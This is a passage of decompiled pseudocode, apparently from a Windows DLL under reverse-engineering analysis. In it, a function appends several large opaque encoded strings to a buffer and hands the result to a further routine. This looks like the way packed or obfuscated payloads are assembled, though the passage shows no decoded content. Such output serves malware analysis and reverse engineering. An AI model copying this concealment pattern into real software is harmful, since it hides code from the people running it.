str.NM6hBrTGZkdSVRLuqWcGdTEWyaJ7OEFS7ff_NDfpnMqhvfgXGhWKwl5ltXMkIUeivcDSemUGLqeay7Z0UWWHzz9TtQV2AdsglDiETzJeQlnQQ418IEFqg3LOE7SeNjM1vbl8IE4DDXrQADvmgp9TPqjKrqGacbLSAcCZBhsDDthSVZ8JEGcH9EV6ElG0_ZTOXo1MbZEUWGTpT9TvzV2BWEHyzHHMRUKBwhTPsAWcQrG6TcA9EV6Fvs3NEHZEXoxv3MkJdk9eMCsQV2AQxlNDdI_unm_QPlHMAmcQqwbnV_n16Fsiy_6tW3ApBYLZ0UWVN2XlSQV2Nd9kNDeBORU9uFxS8AmcT5eUxl1snV6GjF0PkHTIXo9WSJ90rAqZmc1TX1khpBaKbldTHfDhsPHK4r9d8REGuHUSKXKXt3YmjbEXo5tUMkKSFaUt2UemUCfbtlNLZEUWESBD9T_y12BU7kcBNQQfKhvbQXGhGTtVnscBNQ9EV6Ejhk177ZEXo1cLxMUW0ayXt3ZsoGcT7ueBNU_HV6Cnfee40a3BpBDHN8DFaQj8btx12ZRbsQBMoPbgaZh7WSZSVZkhEGtP8zFet7QMXTMXo5P_ZkUW1Rw3N3YqxyfcHkcBNcUeyhvb4nGh3J9Hfa83MkJXWyQj_SemUCVTWay_ZkUWFbw3N3bqeAxNrkcBNQ635eQr4nGhEoYsrh83MkIVdjQjSWmUGRZ8BEGMM9HV6Fp_NPkHTIXoxQ2cBFfYaZmcKxEFS3hJBbMDhtNtdy2t3ZsAWcQaU6cj__nV6GrJffoCzUdXgbDEAdXnV1xdVPkHbGXo9tUMkLRTGv8DaemVqHdXgZDEAdXnXBhtjtQV2DRLosTcEdTHXBht7tQV2ARrueBNQ_n16HrYXGmG6taaay_BEUVG3sj9ThpwVJUHueBNggtB1iO66PYsa3o2k3TGJORUw0t3XmOnXl6icBNctwJeQlQXGh0h3BpBaPZsUW1aw0t3YoHAW16icBNQWEBeQv4_GhFY1BpBZARMdTHfDhsDhek3qDUhEGc_HV6Er4nGhE_2fM783MkIdhZQj_YemUG2FIl9dYC_H16Fv43GhVV1BpBYDdiis7fNhsH6OF4VdUhEGNE_n16EnvYemUO3hJBVL5EURG2dQGswQXZwAZjNDdM_qwORD9TdsrPfVhlNATJnNOivcAbsxV2JRboeZf_psaGWf92_S1SVbddzcj_PbgrynPaYmUq7UgMNDc9XYheQjDXmkFSVbcozMj_snV6HnFPkHq3NbtvHJCRVw3t3YpESVV7kQBNcCk1ZQvgXGhUFV5ltXMkIc0gQj_YcmUGork3jOJIRUKw3t3ailBqqHkQBNU_EevvfgXGiHyGl5ltXMkFS73vcDSSmUy9aiSy_BEUWGUTz9TVQV2BQLscBNQ9HV6Ep7NPkHTIXo1AKULdXXVDhsDesoWcT7uYBNU_n16HtdmDEFSGdP5ECcHdTEXyWRDd8ohdRfuTx9J_tIDgbYfGkkHHdWJfLTsJfYbunvqPkFhlRLoccOJMM2ZByOmUFS1BN1qmAtNLoTUoeS4HBnork3jOJICHfNy9T1HF_3ht1vXL0snRGC6pTPvmBGDx1tXoY02vPc74mJg4FWsPkeS22nW0w0pLie6Mu5kgxLxQdTHfD8ldwU81CuV53L_QvYbYkYzPkHZGH6S1Y4DdTFeg9VQtxRylDtFN7Z1VSbPRTUe1Go6F5ltUIQ4jAfzr4WLnYKqqHkeSe6r9WMw0pD6xG6i5kgHD7bdTHfNxc8tzko1CtNfzNxD7obarYXGnHZEK7scBMo_nROBrQeHsoHTdchEBfohEZfQnfQhEPlpKpHLsXnXGjcbtylCHdcVLGBI9t0OCrTnGtlSVV4tv5sk5TFeQn7Y5gnbJb4tvV_Y_rV6yj9TPsgWcXbusBOAdTFeCrSqtwV2dbYuGzcAPbpbnuFSPoYWcRYvdjcAPbSeN0aUemUSFN9lNI2Cge0oy5g0AiTMXolM7ZMUXFn\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 0x7f;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar10 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar10 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar10)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar10);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) goto code_r0x0001800437ab;\n    ppiVar11 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar11 = *arg1;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar13 = 0xf;\n    piVar7 = &uStack88;\n    piVar12 = uStack88;\n    if (0xf < piVar10) {\n        piVar13 = piVar10 | 0xf;\n        if (piVar13 < 0x8000000000000000) {\n            if (piVar13 < 0x16) {\n                piVar13 = 0x16;\n            }\n            piVar1 = piVar13 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar12 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar12 = piVar7;\n                }\n                goto code_r0x000180042d05;\n            }\n            piVar7 = piVar13 + 5;\n            if (piVar7 <= piVar1) goto code_r0x0001800437b1;\n        }\n        else {\n            piVar13 = 0x7fffffffffffffff;\n            piVar7 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar7);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar12 = piVar7;\n    }\ncode_r0x000180042d05:\n    uStack88 = piVar12;\n    var_40h = piVar10;\n    var_38h = piVar13;\n    fcn.1800121b0(piVar7, ppiVar11, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  str.ZboTJYda9Xzfork3jOJIFafJ1hYvzQ1Pvk0KrxFErgbbfgWUUgUVV6kWVgDHnQxOrYWUcAnOspikCiBAF6gX59MQQt3JtlNPZtCjzfN0Bb93MjkhsC9NoAdbAbJYXNPkHTEDkatzcAtFw5T74WWRkTVV7kQVCbwjBehXqksG5SVRLocTC5MDFeQv42yUfTIKkwRz4AsnQp_AZTPoA3Ik6kUUAD9EQpVfOi88oXItchEAeLME7XBht7tQSlEdUoU7xVGrgaZh7TRhTVRbk8JcAdTEDgfOfdsKbdUhEFeJMRVqjhCPkEa3k8hvTVI9jBaCryXBoIa3potvW8IPbguUnfaRlkHFAgkY3NHfAWw9ODPkFS3hsCcLx1Cn3VP0gXtzV2bRLsSBMwPbI6ZhdTtwV2dRbuxdyZTFeCrQOUYYXmlRANDfHMOIY8D9TQSF2IllNAT_zQtcQjUe5qZIl5lCQ0CdTFRxhJXPkFvik5lNDiEfjJeQgKRDEFSWtoWNjcASNYIQj9curtTVV5YkrwAdT7a0T5TPnx0yF5lQEA9jepeQjDWp0VSVZkgW9iXdTGfL1BXVQw9LtcoW_ZtGjjfN1CT9IzN1CsKAnrE6vYb9VAiPkHTEOmojcj_tFTpUr4miXyUaHUhv3K3_mQxCrQe4aknr6GaeLqcUeFeQj_YQjZDn4sv0QoPLolcnbY3QANFAA49_BFynaeQj8btx12DeZs_wqN9HzhuMCzCA3fEFmkWYgKtFThQL4mgb2yY16icYDlqjFeg1rkPMof4qmEfbzPtNtay2rkvzTlsUlsNPBFzvnNQj_Ye_qTtVrscYyBMIrO_z9T_yTpUd8Qjz5c7TGZB_hNhUFSlDOiN7ZFsgPnQj_SS4Y6ulFl83JvrrpeQr4eUc9wANkWVgGtFQxSrQWUcgXOt8QWw8KIzSZB_yt_0FSPhumTL5FtrArgZ7fNUXTIJ2yvzRH9ESdwP4CfcoX6tchEGdIHSBCrYXGgnZEJ0hvUMkNbgaZgfYey7bEXpNv3LHMboTbQGicgWcX6NfF0BdcaGWf92B8StqlvDvzcAnAegvcCUe_ZAr15lfLzTHnTpPLYWicAX4pyCNDeBAIbtJUhTQQ9_75lNFxFGlzXB1CSWy5Z1BsKCtr_irAbLdddwb7TIDH5CnP9MboTLbQeiakpDqGajM_bdTG3mMKswYYXOqX4NDe4_LnWyv42UUXTEDESizcA_nwxtd6S1ETbADEOcVge_HQxw0o8IBpXVZkgjwgvdTHfN4TtI_G_1BPeT5m_ybArfDkj7zZEOXucVjoC_FeQnfY5gmljUWlERnBis5buuRTPqgqKGa83JvgPdeQr4mURrJOZ7keVhhMZA3w0o8AU28vJkgj55GdTE1B4QJtwTp1CvedRYZdfYbhVzsPkGTMJlrtULHv8qGbfgWiffrVV7kcYBCEjFew0rkNJldVdUgg75EUQHVB_gXtQTp3gsKvXMkXdl7zcCsdsgXihbg9DiE9syhvXfaS77qsghlNN7fic6hCrQW4QnbEFGicVi21TFepzYEPvTGDFo6I4q9EQx_MPqFAXZEDGicYAB2TFew3Lk4cRnOt8QgitQF6ZB4D5jkFS3hPaw9a40iE2SP65O8gH6p8Iiz2BMI6QED9TtQztor9O_ubpdvufqznac_4a2BNqtUK_Js6hvfgW_UkeVV6kWfQI9HSd2HZTPsoXltcg97Z1tvCQRjUe_rN9V5ltUK7WVRPgL4mhfujCPikUYwM9ETlposZ_YYXOjN3NDeBMF6A4sCsvww9QwTMuvZtGjbfB1Cu30FS1CsKfaADd7obLbYXGnHZEOXscBMoMbgaZh8XtQTt3gum3Ns8dDHkQz9TPsqa3hvSD_407peQjAXxKiarqGa83LHv3ReQn7qFkFSVd8g89H4is7fN_gLBkRSkhvSTJwAdVob9VPae_bTIOm3hN149ETp2L38RoYX7g1bNDfBGIpVg1LoLioX7nPscYy4CD2Qhb4mhW0AV16icViLnDFe\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 0xff;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar10 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar10 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar10)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar10);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    piVar6 = arg1[2];\n    if (0x7fffffffffffffffU - piVar6 < 12000) {\ncode_r0x0001800437ab:\n        fcn.180001320();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    ppiVar11 = arg1;\n    if (0xf < arg1[3]) {\n        ppiVar11 = *arg1;\n    }\n    uStack88 = NULL;\n    piVar10 = piVar6 + 0x5dc;\n    piVar13 = 0xf;\n    piVar7 = &uStack88;\n    piVar12 = uStack88;\n    if (0xf < piVar10) {\n        piVar13 = piVar10 | 0xf;\n        if (piVar13 < 0x8000000000000000) {\n            if (piVar13 < 0x16) {\n                piVar13 = 0x16;\n            }\n            piVar1 = piVar13 + 1;\n            if (piVar1 < 0x1000) {\n                piVar7 = piVar9;\n                piVar12 = piVar9;\n                if (piVar1 != NULL) {\n                    piVar7 = fcn.180002500(piVar1);\n                    piVar12 = piVar7;\n                }\n                goto code_r0x000180042e98;\n            }\n            piVar9 = piVar13 + 5;\n            if (piVar9 <= piVar1) {\ncode_r0x0001800437b1:\n                uStack88 = NULL;\n                fcn.180001230();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        else {\n            piVar13 = 0x7fffffffffffffff;\n            piVar9 = 0x8000000000000027;\n        }\n        iVar8 = fcn.180002500(piVar9);\n        if (iVar8 == 0) goto code_r0x0001800437b7;\n        piVar7 = iVar8 + 0x27U & 0xffffffffffffffe0;\n        piVar7[-1] = iVar8;\n        piVar12 = piVar7;\n    }\ncode_r0x000180042e98:\n    uStack88 = piVar12;\n    var_40h = piVar10;\n    var_38h = piVar13;\n    fcn.1800121b0(piVar7, ppiVar11, piVar6);\n    fcn.1800121b0(piVar7 + piVar6, \n                  str.0DCZBhtjmdVSVdUpEAf3lImVKRf8_6tW3ApBBLxMUQGpo4da9XzffpS03TTKtNhYy3N3DsoecW6S1fbqc7gKZg_SSmVil9JtNPBEUQXMbz9TVQV2YR3scBM0zbjWyrfSSmVmjctrNPCF7TFeQhA1PkHZ2MZlNDf3lIlBx9QC_6tU3Mv9NDcA_rzGQj9TyaCTv13soa8AdTGf76dTPkFe1Ov9NDcAG4NXQvjWrkFSVbGANDeB8KFeQj_dukFShPP1NDcAHrTOQj9THMjXxV5lNLa15TFeQganLkHZwNZlNDeL8KFeQj8XtczKVV5lcLxEUQXVDhtjdkKB3BpBFNCTzBeBrSjhmH6VV4ktcGfJKhBf1ciPkFd0HeZy8hI_rTWQj9TdsrOcd5kNDdI9PUOQz9Tfx4TCwE7afTH8LleQj85qUFSENWjtYKIdTFe5Je5Z8Dn3V5lNBh9vHWf57dTPkFZ1OvtNDcApb4Kg77mtkFSVZUtfOzH8KleQj8Vt0FSPtv9NDcAJ7jb2j9TPvmjpa6Vv7qYdTFetd7r4wYiSpPML6V7TFeQr7mpkFSVYbom3GBwKleQjdfoUkhpBBNsdTHVDhtjyaB5n4MN_3BnDTXDhtj_y12ZVzkQBMwGJdYQvjWrkFSVfu7NDdr8KFeQj9t8TCVV5ltbqQdTFeuJnZjoD3xV5lND2BwKFeQj8upNjs3tv1NDcAMboSZg_Yq9lSVV7uub8AdTHXBht7dsgmcX6NPQEBddi9vMCsdsqWHdc9PHJBSEWy0dLawAGFAskYnZXPbw2infS0lFTVV7ucUdI_kQ2CrQuXsgWcW4tvUMkXXzVu3faQmVyEdWM3Hbsis4ayVt3anKJZpeicBN4PuZeQoc_50FS3BPlcLzzsnV6PsAOPkFvX1xlNDiEeDReQgJIIkFSWtrzMDcASHYbQj9cuqdVVV5YbkQAdT7a5jxTPnz8zl5lO7OddzFef5iFPkFd0fFkNDc9GeheQjDXpEBSVWOi0DcAAUZjGNVTPk7XyVllNPBEUWFmlD9Thur4__TkeBNQjrOOsr4nGhFAupBqtUMkJauLUWuSUmUCWd8REGflLjJehXt3alXQVV7ueBNUgtCfqDraamUG1CpBYG0CeTEayXt3asoGcQ4tv3skHdkCkz9ThgYXVV6MAcj_ivYaZm_NLUFS7XssphOLORUOtd7rGwjAcXWv5d4Dv_C3QLYfGhGTOXo1PbZEUWGQ9T9TvzV2BboF3fGBARUOjnG9IYWcQqz3jcAtF16FjDSemUGNtZlNLZ0UWXsujJTQV2DSpMNDeBMRUGOtNTPoAcQZi9VskLTTfNhsL8qJVVZkhEFcmGzFew3N3Xq29rGHkQBNgpvpgHb4nGiE9BZgF83MkKb6BQj_SemUOZ1uay7xMUW2poxSZ76hRnxfu4_bpdrgSZmPSSmUO2RMtJnLc3nXBhsbtQV2CdchEHeLMRUy3t3BsoWcQYhv3MkIXXVDDfYcmUC3BpBHHNMMEWy3t3Hqn6F5lsfcP8a9YQj_rkNpSVbd8ysj_zfa6Qj6MbtqpkhEFdbezFeubnoW3TEXoFCTkAdbAqZl8hvEtSkhpBbAp7dTHfNhsLUIpWBJ8JEG8E9H16GrN93DPTIXo9Elf5AvYaZmP8C0FS1CpBaDkSIXrVDhsPyaB5n4MN_3BnDfXDhsPvzV2CeeOhDfHMRUKQehTPsAecQqRycsv9EV6Ftiswm7ZEXo9v3MkFXXVBhsHtRV2CbZg3Mn_snV6EhxTPkGTOXo1OXOLlbAqZm9Jt_9T1BpBZFQ8is7fDhsDMdWQDt8REGc_oM4FyXt3bkIWcS4kN_OJMjnmWSNTPqhqKGacL5tpfYbgh9TPkEa2BuVfL5FzXnVRHPecEa3BvFv3EI_HT2hXt3boxVV6kWBNQcbAqZm8728HPhpBZCGJMRUOw0t3bj7wWgyicBNgDfNeQlQXGiFH3BpBVI99efZyXN3Xraz7b9nI4_BnzfXFhszvwV2NSYNDeBARU\n                  , 12000);\n    *(piVar7 + piVar10) = 0;\n    uStack104 = 0x1ff;\n    if (arg1 == &uStack88) {\n        if (0xf < var_38h) {\n            piVar6 = uStack88;\n            if ((0xfff < var_38h + 1U) && (piVar6 = uStack88[-1],  0x1f < uStack88 + (-8 - piVar6)))\n            goto code_r0x0001800437b7;\n            fcn.18000253c(piVar6);\n        }\n    }\n    else {\n        if (0xf < arg1[3]) {\n            piVar6 = *arg1;\n            piVar9 = piVar6;\n            if ((0xfff < arg1[3] + 1U) && (piVar9 = piVar6[-1],  0x1f < piVar6 + (-8 - piVar9))) {\ncode_r0x0001800437b7:\n                fcn.18001484c();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        *arg1 = uStack88;\n        *(arg1 + 4) = uStack88._4_4_;\n        *(arg1 + 1) = uStack80;\n        *(arg1 + 0xc) = uStack76;\n        *(arg1 + 2) = var_40h._0_4_;\n        *(arg1 + 0x14) = var_40h._4_4_;\n        *(arg1 + 3) = var_38h._0_4_;\n        *(arg1 + 0x1c) = var_38h._4_4_;\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str._ErmqqeYwb7oXOMUqvBEUWG9KT9T1r9QVV4pv_xM_vTkRj5TPgnZmhbsgBOQdTFeDrIPGiEb3gV1fbxrbXjVMR8ataINHaGFeLzcPLgFSnbaTVEf3BVFeb5DbWYWwdMztcV2lV5lNHL6RWWQj9TdsrucfZlNDeLwRXQj9Td8gJpdchEGdJ9lKQrTXGvFSVV4puTJLDjFey3t3fsrWccZlNDdJ_EqOy0t3DsgWcXbusBOQdTFeBwyatwV2dba4_sj_PbpbrEVSPobWcdZlNDcQrzFeCrqTMcS0VV5l87Mk9TFeQn1VPkGTXrlNDcAfLrSZr9TPkHq0E4nPMDhXvuPqzyZ_6hU3NJBtDcAdbDqZr9TPkFm4xIztYMk9TFeQngzcReV0XrdNDcARB5eQv7_GvlSVV5i9ZskzTFeQjLSimXqVV5lO2sEdfbaZrdTPkGc2l5ltbMk_TFeQp1lPkE50XrtNDcAaLjaZrdTPkHZ2XrtNDcAzbY_Wrmk32qYhLdm_o2ymyzBg9ZWt8123V5lNLa0UbleQj_YqUJS3tpBvDcAdbraZodTPkHZ0XrlNDcAzMjTNB27ceatqhbsMcN5dDEWwVt3FkEe2Ft2TjcAObqRCrSADYjbIXpFydI_m16MnfYSmUqHd2hVGjDuXndrheUemVaU3xlNATAObqfCrYXGk2VEXpVeb0AdfAyZg9cvwV2ZUtnNDeLMRVug99QtwV2Zd8REAduiDheyXt3DsgWcW6icBNAaXtJY_hXGpuQMz2icBM4s10wcvgXGgmJl4MH83MkRcNRQj_YcmVi7UfkJS_3lIlBx9QCFYuDvF2v9d4G_H16cr4XGnFZR15lv3skRca_g9VQtxV2ZZ8BEAcP9EV6cuGakHZEXpVvXMkRboSZgfYemUSZpYkvT_HMRVuhfpTPoA2cW5qtUMkRe8zqF3YemVi3BpBBLxMUXnVRhtg9gDbHVqicBMwqiBeQr4XGnFb1V5ltXMkRdYwQj_ScmViPHO4cfZkUQFbw0t3Dn8CeXucBMw_HV6cnfQmmRmZKpvXskfXndrneUemVitL9lNPBEUQVo7D9TQV2bbu0NDfHMRVioS5TPoYWcQ6j1jcAtFV6EjeSUmUCVt8REGcsRhvGk1N3bsAmcQ6wLC5MsnV6KjwyPkEW3py0WBNo9HV6Kml3PkHZEXoN9dcD_HV6Koda9Xzf1CpBXIIndzGZBhszFH1SVd8hEFfQW86hyXN3XrazFNWt9d0E_GV6IoWHFgyQ1BJBVESNSb7fNhsz66ql2tUhEFeLMRU2yXt3bqlj8KGafLTEPfIWy2N3NgnbIXp9fL5UUSELFX4FdsqHd2JVLxFPQKMD7SitwV2fdUgdL5EURG2zPiswYYXfUKyNDfHMNVLwj9Td8qcPhuBM75FkfAzpjjSS6UGRl1l83LoktteQr4W1i8uVV6kUd8G9ES2JEUHPoYXfYobNDdrMBk6y3p7vzR6V9Lh5LZ1XSqx8Ue7GEf15ltXLwSKpeQr4mzotYVV7uccdE_nx2BrQW1soHsdchEBfoG92hvXfY5gnXlVHhtzUAdfYbsiQAPkE5EK5_vXLwzZZOKjWSW7FW1CuV1CyHdfYbrtdPPkHTGLKGvN82tFyySr4m0t2aY16icdd3DFeg1qzLsAntRYOoKHBGNFRw0qzt1Fov98Q1DgnT9uZBxcw2EFSlDNNObZFXX5GvcDSS2nr7a0PtXIoU8Ohvb4mFrOoXcuicd_rHTFeyXK7yaB5n4MN_3BnDfXD9fSc6k24KM0tULobpoimr4m1qIY39eicdNfpDFeKXq3a8gXsebAdS2k9ES6rWvssofsamEH_3RnDKUg9ZWtwy21CuBD9uedroTrrQWzgXZHg5u_LxFkXXVB9fYa2nbGXpVv3rg_HV6ateMEkFSHdWVfLLAerUzQz9TQS67thlNHLo1oTqkXac6nTILaFq3AAsnSyWwNTPoA_uVvkQdskWD1ehXqj0ehSVd8gxKtZdTHfN8xNEtSkhtNsDgAdVob\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437bd;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437bd:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             str._mV6FrYXGmG6Klaay3BsZFYQj8SYR4MDgOmHuLqXjXGTcatypCHNcWLHqJPhEJCry_XsrWce5lNDeLwRX2Qj9Tdsrcc5lNDeJMRUeybt3nkFSVdcREAJMRVuybt3pkFSVRtW_b5EURkXyecbtbsb3DXd3Mmnis4WyTp0ZkBSktpBvDcAdWljQjUumXeVV5l1yUAdXnbgjDWmEFSVZkhEGOCqTFeI29I97rkaxr01xEUWUiy3t3asAWcQr3HjcA9EV6FnZ1UEGVEXo17oMAdfA6Zm9RvzV2BerJ2XWBMRUOhyRTPsAmcQ5QTdRCsrV6yj9TPuewVV7kgBOIdTFeSMMgCcDecdZlNDfakc7yKbt3tkFSVRHssBOIdTFew4t3tkFSVb_MzAiL8RXWQj9TtQV2BdUhEGPo0LWhvXfaOyMFVF4tt1MkVTESyfAXtYca3o0tv_r_pX3THhszd8oJRRfuXy9J_kJC7SwYYIe3oIsvWwIPLg1UnrafVkEAh8zfLTsBbraZt9TPkEa3uJB7DcAdbrqZu9TPkEa3vJB_DcAdXXV9hvjPkFS3BpBZLyEUfFeQj8atzqS3CpBdH6JHoHXBhtjtcV27V5lNL5EURkfj5TPkEa3oQgvUSYnaL4vcAbtUSWA19l87Mk1TFeQo6IPkEa0J5qsYQAdTGZBhs3p7RSVebGvxm69EV6Js_vWGXTGXoBADsbJLAaZluKTkFS1CpBUCbYBkSZBhszicBSVd8hEFfUSzFew3t3Xr6IVV7kcBNgcdWhvb4nGiF1I1dl87Mk1TFeQlhCPkGTXrFNDcAerrSZp9TPkGltOdbNXFHtNtdy6t3nkFSVZ_JEJcAdTFQw4t3nkFSVcILOzeL8RXQj9TtQV2NdUhEFO6qaEdYNdrvb6tHddgyWIBdXDnQz9TPgXZkxbu4XLvnXX9hvrPkFSHdfZEIcAdTESz2N3TgjZDn4sv1woPLq9A2EMYAmttZKpHuLqXjXGTcatxJCAhbm2GeL8RX2Qj9TdsrOcf5lNDeLyRXWQj9TtwV2HdXhEK8AdTEXy2S7twV2bd0BEAcARuPXPht7d8IxnV6NCpL_innVR0gGP0GVEXoNiG8AdfYaZlOgR0FSHdulO7KqdTFehbt3vkFSVbUVNDe4uvp8fP7_GsFSVV5mtYMk9TFeQu4OOEGV0Xr1NDcAeWleQrTfGtFSVV6S1RzKpNhdiIX2U6aPlLdjvbsk5TFeQoaPfFdi1NpBpDcAdUyjvcDSumXCVV5lPdD_irDqZq9TPkEkA6Oa83MkHZ9zQjSWmU6W58JEF8P9EV6Kk42MUHZEXoNv7Mk5TFeQrTXGsFSVV6N07b_innXR4sHP0EXZpcgB_eLogKXCrbPGsFSVV4tv2skFXndhm8Mdr6ymRLscBMYJnndrl_YumXKVV5lv6sk1TFeQnpg_sgOcW7scBMoPbI6Zh9T1mf2qqEtvzJnITBehXt3dgYVVV6icBNMqdteQvgXGhFikV5lfLLAerTtQj9TcV2xV5lNARqdTHknq8QHPiJSeRI9Zsk5TFeQj3SumXCVV5lRvIAdbDqZq9TPkFXJFBl87Mk9TFeQjR3PkE50XrlNDcAQ7jaZr9TPkHT4XrlNDcAVt7Pw1TXGsFSVV5bvbMk9TFeQr7XGsFSVV7lOcj_9IV6wj9TPsJCMDyicBNAz5eQr4nGgHJUkXItUMkNWscU5LYemUS3tpBtDcAdbraZq9TPkG6696ay3JcKINQz8XtYJhh22sfLTEFWoWvd8TbQnRuQ4sv7oW5KhvQyTtwV2HRbuMUZTdDGZBhsTFJpSVZkhEHPuYTFeCrqTMcTeVV5l83MkQa0cQj_ScmVmgpCFSvZkUQVYw0t3CoADZeaicBMw4E9eQrQXGnHfWR7dh_ghQDKXy3N3DsAecW741fmt9EV6cp9rOyVEXpd55cAdboSZgek32qYhLdm_o2Cge0og9ZWtw12befEbaxn9EV6ekbaNkHZEXpdv3MkRboaZgu70T6tqhbsMftSdDEW\n                            );\n    if (arg1 != ppiVar11) {\n        piVar6 = arg1[3];\n        if (0xf < piVar6) {\n            piVar10 = *arg1;\n            piVar9 = piVar10;\n            if (0xfff < piVar6 + 1U) {\n                piVar9 = piVar10[-1];\n                piVar10 = piVar10 - piVar9;\n                if (0x1f < piVar10 + -1) goto code_r0x0001800437c3;\n            }\n            fcn.18000253c(piVar9);\n        }\n        arg1[2] = NULL;\n        arg1[3] = 0xf;\n        *arg1 = 0;\n        uVar3 = *(ppiVar11 + 4);\n        uVar4 = *(ppiVar11 + 1);\n        uVar5 = *(ppiVar11 + 0xc);\n        *arg1 = *ppiVar11;\n        *(arg1 + 4) = uVar3;\n        *(arg1 + 1) = uVar4;\n        *(arg1 + 0xc) = uVar5;\n        uVar3 = *(ppiVar11 + 0x14);\n        uVar4 = *(ppiVar11 + 3);\n        uVar5 = *(ppiVar11 + 0x1c);\n        *(arg1 + 2) = *(ppiVar11 + 2);\n        *(arg1 + 0x14) = uVar3;\n        *(arg1 + 3) = uVar4;\n        *(arg1 + 0x1c) = uVar5;\n        ppiVar11[2] = NULL;\n        ppiVar11[3] = 0xf;\n        *ppiVar11 = 0;\n    }\n    if (0xf < var_38h) {\n        piVar10 = uStack88;\n        if ((0xfff < var_38h + 1U) && (piVar10 = uStack88[-1],  piVar6 = var_38h,  0x1f < uStack88 + (-8 - piVar10))) {\ncode_r0x0001800437c3:\n            fcn.18001484c(piVar10, piVar6 + 5);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.18000253c(piVar10);\n    }\n    ppiVar11 = fcn.1800017b0(&uStack88, arg1, \n                             